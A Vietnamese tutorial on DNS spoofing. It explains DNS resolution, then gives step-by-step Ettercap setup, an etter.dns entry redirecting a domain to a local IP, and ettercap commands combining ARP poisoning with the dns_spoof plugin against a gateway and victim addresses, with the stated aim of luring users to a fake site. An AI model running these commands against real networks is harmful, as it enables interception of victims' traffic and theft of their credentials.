# Ettercap

## Giả mạo DNS

Giả mạo DNS là một kỹ thuật MITM (Man-in-the-Middle) được sử dụng nhằm cung cấp thông tin DNS sai cho một host để khi người dùng duyệt đến một địa chỉ nào đó, ví dụ, www.facebook.com có IP XXX.XX.XX.XX, thì cố gắng này sẽ được gửi đến một địa chỉ www.facebook.com giả mạo cư trú ở địa chỉ IP YYY.YY.YY.YY, đây là địa chỉ mà kẻ tấn công đã tạo trước để đánh cắp các thông tin tài khoản ngân hàng trực tuyến từ người dùng.

## Truyền thông DNS

Giao thức Domain Naming System (DNS) như được định nghĩa trong RFC 1034/1035 có thể được xem như là một trong những giao thức quan trọng nhất được sử dụng trong Internet. Nói ngắn ngọn để dễ hiểu, bất cứ khi nào bạn đánh một địa chỉ web chẳng hạn như http://www.google.com vào trình duyệt, yêu cầu DNS sẽ được đưa đến máy chủ DNS để tìm ra địa chỉ IP tương xứng với tên miền mà bạn vừa nhập. Các router và các thiết bị kết nối Internet sẽ không hiểu google.com là gì, chúng chỉ hiểu các địa chỉ chẳng hạn như 74.125.95.103.

Máy chủ DSN làm việc bằng cách lưu một cơ sở dữ liệu các entry (được gọi là bản ghi tài nguyên) địa chỉ IP để bản đồ hóa tên DNS, truyền thông các bản ghi tài nguyên đó đến máy khách và đến máy chủ DNS khác. Kiến trúc máy chủ DNS trong toàn doanh nghiệp và Internet là một thứ khá phức tạp. Như một vấn đề của thực tế, bạn có thể hình dung chúng như các quyển sổ chuyên dụng cho kiến trúc DNS.

![DNS spoofing](/images/DNSSpoofing1.jpg)

DNS hoạt động theo hình thức truy vấn và đáp trả (query/response). Một máy khách cần phân giải DNS cho một địa chỉ IP nào đó sẽ gửi đi một truy vấn đến máy chủ DNS, máy chủ DNS này sẽ gửi thông tin được yêu cầu trong gói đáp trả của nó. Đứng trên phối cảnh máy khách, chỉ có hai gói xuất hiện lúc này là truy vấn và đáp trả.

Kịch bản này sẽ có đôi chút phức tạp khi xem xét đến sự hồi quy DNS. Nhờ có cấu trúc thứ bậc DNS của Internet, các máy chủ DNS cần có khả năng truyền thông với nhau để đưa ra câu trả lời cho các truy vấn được đệ trình bởi máy khách. Nếu tất cả đều diễn ra thuận lợi như mong đợi, máy chủ DNS bên trong của chúng ta sẽ biết tên để bản đồ hóa địa chỉ IP cho máy chủ bên trong mạng nội bộ, tuy nhiên không thể mong đợi nó biết địa chỉ tương quan giữa Google hoặc Dell. Đây là nơi sự đệ quy đóng vai trò quan trọng. Sự đệ quy diễn ra khi một máy chủ DNS truy vấn máy chủ DNS khác với tư cách máy khách tạo yêu cầu.

## Giả mạo DNS

Có nhiều cách để có thể thực hiện vấn đề giả mạo DNS. 

Mỗi truy vấn DNS được gửi qua mạng đều có chứa một số nhận dạng duy nhất, mục đích của số nhận dạng này là để phân biệt các truy vấn và đáp trả chúng. Điều này có nghĩa rằng nếu một máy tính đang tấn công của chúng ta có thể chặn một truy vấn DNS nào đó được gửi đi từ một thiết bị cụ thể, thì tất cả những gì chúng ta cần thực hiện là tạo một gói giả mạo có chứa số nhận dạng đó để gói dữ liệu đó được chấp nhận bởi mục tiêu.

Chúng ta sẽ hoàn tất quá trình này bằng cách thực hiện hai bước với một công cụ đơn giản. Đầu tiên, chúng ta cần giả mạo ARP cache thiết bị mục tiêu để định tuyến lại lưu lượng của nó qua host đang tấn công của mình, từ đó có thể chặn yêu cầu DNS và gửi đi gói dữ liệu giả mạo. Mục đích của kịch bản này là lừa người dùng trong mạng mục tiêu truy cập vào website độc thay vì website mà họ đang cố gắng truy cập. Để rõ hơn bạn có thể tham khảo thêm hình tấn công bên dưới.

![DNS spoofing 2](/images/DNSSpoofing2.jpg)

Có một số công cụ khác có thể được sử dụng để thực hiện hành động giả mạo DNS. Đó là `Ettercap`

## Cài đặt

```shell
# Console
$ sudo apt-get install ettercap-text-only

# GUI
$ sudo apt-get install ettercap-graphical
```

## Sử dụng

* Chạy với giao diện đồ họa

```shell
$ sudo ettercap -G
```

![Ettercap GUI](/images/ettercapgui.jpg)

* Chạy với GUI terminal

```shell
$ sudo ettercap -C
```

![Ettercap GUI console](/images/ettercapconsole.png)

## Configuration

* Có 2 file cần lưu ý là `etter.conf` và `etter.dns` mặc định khi cài đặt sẽ nằm trong folder `/etc/ettercap`. Nhưng nếu không biết ở thư mục nào thì có thể dùng lệnh `locate` để tìm.
* Mở file `etter.conf` và sửa thuộc tính `ec_uid` và `ec_gid` là 0, uncommand phần iptables của Linux là `redir_command_on và redir_command_off`
* Với file `etter.dns` là file chứa các domain sẽ điều hướng sang ip address tương ứng. Ví dụ

```
# Chuyển tên miền phimmoi.net sang ip 192.168.1.3

phimmoi.net	A	192.168.1.3
*.phimmoi.net	A	192.168.1.3
```

* Sau khi cấu hình xong thì chạy ettercap bằng lệnh sau

```shell
# Template
$ sudo ettercap -T -q -i eth0 -M arp:remote -P dns_spoof //GATEWAY// //TARGET//

# e.g: Gateway -> 192.168.1.1. Victim -> 192.168.1.10
$ sudo ettercap -T -q -i eth0 -M arp:remote -P dns_spoof //192.168.1.1// //192.168.1.10//

$ sudo ettercap -T -q -i eth0 -M arp:remote -P dns_spoof //192.168.1.1// //192.168.1.10-20/
```

* Các tham số

  * -T – Chỉ định sử dụng giao diện văn bản
  * -q – Chạy các lệnh trong chế độ “yên lặng” để các gói dữ liệu đã được capture không hiển thị trên màn hình.
  * -P dns_spoof – Chỉ định sử dụng plug-in dns_spoof
  * -M arp – Khởi tạo tấn công MITM giả mạo ARP để chặn các gói dữ liệu giữa các host.

## Ref

* https://null-byte.wonderhowto.com/how-to/tutorial-dns-spoofing-0167796/
* https://www.youtube.com/watch?v=Y3j-rlA0CbE
* https://github.com/Ettercap/ettercap
* https://quantrimang.com/tim-hieu-ve-tan-cong-man-in-the-middle-gia-mao-dns-66935